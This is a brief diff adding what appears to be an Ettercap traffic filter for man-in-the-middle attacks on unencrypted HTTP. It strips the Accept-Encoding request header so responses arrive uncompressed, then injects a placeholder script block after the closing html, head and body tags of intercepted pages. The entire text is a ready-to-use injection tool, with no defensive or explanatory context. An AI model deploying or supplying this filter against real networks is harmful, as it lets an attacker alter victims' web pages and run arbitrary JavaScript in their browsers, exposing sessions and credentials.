@@ -1,0 +1,22 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+           replace("Accept-Encoding", "Accept-Nothing!");
+      }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+      if (search(DATA.data, "</html>")) {
+           replace("</html>", "</html><script>CODE</script>");
+           msg("js code injected");
+      }}
+if (ip.proto == TCP && tcp.src == 80) {
+      if (search(DATA.data, "</head>")) {
+           replace("</head>", "</head><script>CODE</script>");
+           msg("js code injected");
+      }}
+if (ip.proto == TCP && tcp.src == 80) {
+      if (search(DATA.data, "</body>")) {
+           replace("</body>", "</body><script>CODE</script>");
+           msg("js code injected");
+      }}
+
